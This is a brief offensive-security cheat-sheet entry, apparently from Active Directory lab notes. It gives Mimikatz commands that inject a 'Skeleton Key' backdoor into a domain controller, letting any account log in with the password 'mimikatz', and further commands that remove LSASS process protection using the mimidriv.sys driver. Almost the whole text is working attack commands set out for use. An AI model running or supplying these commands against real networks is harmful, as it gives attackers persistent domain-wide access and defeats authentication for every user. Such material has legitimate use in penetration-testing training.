# Skeleton Key

Use the below command to inject a skeleton key (password would be\
mimikatz) on a Domain Controller of choice. DA privileges required

```powershell
Invoke-Mimikatz -Command '"privilege::debug"  "misc::skeleton"' -ComputerName dcorpdc.dollarcorp.moneycorp.local

//it is possible to access any machine with a valid username and 
password as "mimikatz" 

Enter-PSSession –Computername dcorp-dc –credential dcorp\Administrator

```

In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:

mimikatz # privilege::debug

mimikatz # !+

mimikatz # !processprotect /process:lsass.exe /remove

mimikatz # misc::skeleton

mimikatz # !-
